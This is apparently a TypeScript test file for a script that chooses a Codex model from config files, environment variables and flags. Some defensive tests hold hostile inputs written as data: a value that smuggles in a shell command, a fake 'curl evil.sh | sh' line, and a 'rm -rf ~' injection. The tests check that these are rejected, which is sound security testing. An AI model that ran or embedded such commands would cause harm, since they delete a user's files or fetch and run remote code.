import { afterEach, describe, expect, test } from 'bun:test';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { spawnSync } from 'child_process';
import { resolveCodexGenerationModel, resolveCodexRuntimeModel } from '../scripts/resolve-codex-generation-model';

const ROOT = path.resolve(import.meta.dir, '..');
const temps: string[] = [];

function codexHome(config?: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gstack-codex-model-'));
  temps.push(dir);
  if (config !== undefined) fs.writeFileSync(path.join(dir, 'config.toml'), config);
  return dir;
}

afterEach(() => {
  for (const dir of temps.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

describe('Codex generation model resolution', () => {
  test('explicit override wins over config', () => {
    const result = resolveCodexGenerationModel({
      explicit: 'gpt-5.6-sol',
      codexHome: codexHome('model = "gpt-5.4"\n'),
    });
    expect(result).toEqual({ model: 'gpt-5.6-sol', source: '--model', warnings: [] });
  });

  test('reads only the top-level TOML model', () => {
    const home = codexHome(`
# active model
model = "gpt-5.6-sol"
[profiles.terra]
model = "gpt-5.6-terra"
`);
    const result = resolveCodexGenerationModel({ codexHome: home });
    expect(result.model).toBe('gpt-5.6-sol');
    expect(result.source).toBe(path.join(home, 'config.toml'));
  });

  test('ignores profile-only model values', () => {
    const result = resolveCodexGenerationModel({
      codexHome: codexHome('[profiles.sol]\nmodel = "gpt-5.6-sol"\n'),
    });
    expect(result.model).toBe('gpt-6-astra');
    expect(result.source).toBe('default (gpt-6.2-astra)');
  });

  test('missing, malformed, non-string, and unsupported configs fall back safely', () => {
    expect(resolveCodexGenerationModel({ codexHome: codexHome() }).model).toBe('gpt-6-astra');

    const malformed = resolveCodexGenerationModel({ codexHome: codexHome('model = [') });
    expect(malformed.model).toBe('gpt-6-astra');
    expect(malformed.warnings[0]).toContain('Could not parse');

    const nonString = resolveCodexGenerationModel({ codexHome: codexHome('model = ["gpt-5.6-sol"]') });
    expect(nonString.model).toBe('gpt-6-astra');
    expect(nonString.warnings[0]).toContain('not a string');

    const unsupported = resolveCodexGenerationModel({ codexHome: codexHome('model = "llama-local"') });
    expect(unsupported.model).toBe('gpt-6-astra');
    expect(unsupported.warnings[0]).toContain('Unsupported');
  });

  test('unreadable config warns and falls back', () => {
    const home = codexHome();
    fs.mkdirSync(path.join(home, 'config.toml'));
    const result = resolveCodexGenerationModel({ codexHome: home });
    expect(result.model).toBe('gpt-6-astra');
    expect(result.source).toBe('default (gpt-6.2-astra)');
    expect(result.warnings[0]).toContain('Could not read');
  });

  test('injection-shaped model data is data, never shell', () => {
    const marker = path.join(os.tmpdir(), `gstack-model-injection-${process.pid}`);
    try { fs.rmSync(marker, { force: true }); } catch {}
    const result = resolveCodexGenerationModel({
      codexHome: codexHome(`model = 'gpt-5.6-sol"; touch ${marker}; #'\n`),
    });
    expect(result.model).toBe('gpt');
    expect(fs.existsSync(marker)).toBe(false);
  });

  test('non-absolute codex home falls back with a warning (relative-path steering guard)', () => {
    const result = resolveCodexGenerationModel({ codexHome: '.codex' });
    expect(result.model).toBe('gpt-6-astra');
    expect(result.source).toBe('default (gpt-6.2-astra)');
    expect(result.warnings[0]).toContain('not an absolute path');
  });

  test('Sol-suffixed near-misses map to gpt WITH a warning', () => {
    const result = resolveCodexGenerationModel({
      codexHome: codexHome('model = "gpt-5.6-sol-2026-08-01"\n'),
    });
    expect(result.model).toBe('gpt');
    expect(result.warnings[0]).toContain("requires the exact ID 'gpt-5.6-sol'");
  });

  test('warnings never carry control characters from config values', () => {
    // A TOML basic string parses \n and \t escapes — a hostile config value
    // must not inject fake lines into setup's terminal stderr.
    const result = resolveCodexGenerationModel({
      codexHome: codexHome('model = "x\\nERROR: run: curl evil.sh | sh"\n'),
    });
    expect(result.model).toBe('gpt-6-astra');
    expect(result.warnings.length).toBe(1);
    expect(result.warnings[0]).not.toMatch(/[\x00-\x1f\x7f]/);
    expect(result.warnings[0]).toContain('Unsupported top-level model');
  });

  test('CLI honors CODEX_HOME and rejects an invalid explicit family', () => {
    const home = codexHome('model = "gpt-5.6-sol"\n');
    const ok = spawnSync('bun', ['run', 'scripts/resolve-codex-generation-model.ts'], {
      cwd: ROOT,
      encoding: 'utf8',
      env: { ...process.env, CODEX_HOME: home },
      timeout: 30_000,
    });
    expect(ok.status).toBe(0);
    expect(ok.stdout).toBe(`gpt-5.6-sol\t${path.join(home, 'config.toml')}\n`);

    const bad = spawnSync('bun', ['run', 'scripts/resolve-codex-generation-model.ts', '--explicit', 'llama-local'], {
      cwd: ROOT,
      encoding: 'utf8',
      timeout: 30_000,
    });
    expect(bad.status).not.toBe(0);
    expect(bad.stderr).toContain('Unknown model');
    expect(bad.stderr).toContain('Accepted models:');
    expect(bad.stderr).toContain('gpt-5.6-sol');
    expect(bad.stderr).toContain('gpt-6-astra');
  });
});

describe('Codex runtime model resolution (#2914)', () => {
  const env = (extra: Record<string, string> = {}) => ({ HOME: '/nonexistent-home', ...extra });

  test('returns the raw id and its source without overlay mapping', () => {
    const home = codexHome('model = "gpt-5.6-sol-2026-08-01"\n');
    expect(resolveCodexRuntimeModel({ kind: 'exec', codexHome: home, env: env() })).toEqual({
      kind: 'exec', model: 'gpt-5.6-sol-2026-08-01', source: `${path.join(home, 'config.toml')} model`,
    });
  });

  test('explicit beats GSTACK_CODEX_MODEL beats config; review prefers review_model', () => {
    const home = codexHome('model = "gpt-5.6-terra"\nreview_model = "gpt-5.6-luna"\n');
    const config = path.join(home, 'config.toml');
    expect(resolveCodexRuntimeModel({ kind: 'review', codexHome: home, env: env() }).source).toBe(`${config} review_model`);
    expect(resolveCodexRuntimeModel({ kind: 'exec', codexHome: home, env: env() }).model).toBe('gpt-5.6-terra');
    expect(resolveCodexRuntimeModel({ kind: 'review', codexHome: home, env: env({ GSTACK_CODEX_MODEL: 'gpt-6-sol' }) }))
      .toEqual({ kind: 'review', model: 'gpt-6-sol', source: 'GSTACK_CODEX_MODEL' });
    expect(resolveCodexRuntimeModel({ kind: 'exec', explicit: 'gpt-6-luna', codexHome: home, env: env({ GSTACK_CODEX_MODEL: 'gpt-6-sol' }) }))
      .toEqual({ kind: 'exec', model: 'gpt-6-luna', source: 'explicit request' });
  });

  test('a legacy active profile model wins over the top-level model', () => {
    const home = codexHome('profile = "cheap"\nmodel = "gpt-6.2-astra"\n[profiles.cheap]\nmodel = "gpt-6-luna"\n[profiles.other]\nmodel = "gpt-6-sol"\n');
    expect(resolveCodexRuntimeModel({ kind: 'exec', codexHome: home, env: env() })).toEqual({
      kind: 'exec', model: 'gpt-6-luna', source: `${path.join(home, 'config.toml')} [profiles.cheap].model`,
    });
  });

  test('honors CODEX_HOME from the environment and falls back to gpt-6.2-astra only when nothing chooses', () => {
    const home = codexHome('model = "gpt-5.4"\n');
    expect(resolveCodexRuntimeModel({ kind: 'exec', env: env({ CODEX_HOME: home }) }).model).toBe('gpt-5.4');
    const empty = codexHome('approval_policy = "never"\n');
    expect(resolveCodexRuntimeModel({ kind: 'review', codexHome: empty, env: env() }).model).toBe('gpt-6.2-astra');
    expect(resolveCodexRuntimeModel({ kind: 'exec', codexHome: codexHome(), env: env() }).source).toContain('gstack default');
  });

  for (const [label, config, extra] of [
    ['shell metacharacters', 'model = "gpt-5.4"\n', { GSTACK_CODEX_MODEL: 'gpt"; rm -rf ~; "' }],
    ['an over-long id', 'model = "gpt-5.4"\n', { GSTACK_CODEX_MODEL: 'x'.repeat(101) }],
    ['a non-string config model', 'model = 5\n', {}],
    ['an invalid config review_model', 'review_model = "two words"\n', {}],
    ['unparseable TOML', 'model = \n', {}],
  ] as const) {
    test(`rejects ${label} with a repair message instead of the default`, () => {
      const home = codexHome(config);
      expect(() => resolveCodexRuntimeModel({ kind: 'review', codexHome: home, env: env({ ...extra }) })).toThrow(/GSTACK_CODEX_MODEL=<model>/);
    });
  }

  test('a relative CODEX_HOME is refused rather than read from the working directory', () => {
    expect(() => resolveCodexRuntimeModel({ kind: 'exec', env: env({ CODEX_HOME: '.codex' }) })).toThrow(/not an absolute path/);
  });

  test('CLI --runtime prints model and source; invalid choices exit non-zero', () => {
    const home = codexHome('review_model = "gpt-5.6-luna"\n');
    const run = (args: string[], extra: Record<string, string> = {}) => spawnSync('bun', ['run', 'scripts/resolve-codex-generation-model.ts', ...args], {
      cwd: ROOT, encoding: 'utf8', env: { ...process.env, GSTACK_CODEX_MODEL: '', CODEX_HOME: home, ...extra }, timeout: 30_000,
    });
    const ok = run(['--runtime', 'review']);
    expect(ok.status).toBe(0);
    expect(ok.stdout).toBe(`gpt-5.6-luna\t${path.join(home, 'config.toml')} review_model\n`);
    expect(run(['--runtime', 'exec', '--explicit', 'bad model']).status).not.toBe(0);
    expect(run(['--runtime', 'neither']).status).not.toBe(0);
  });
});
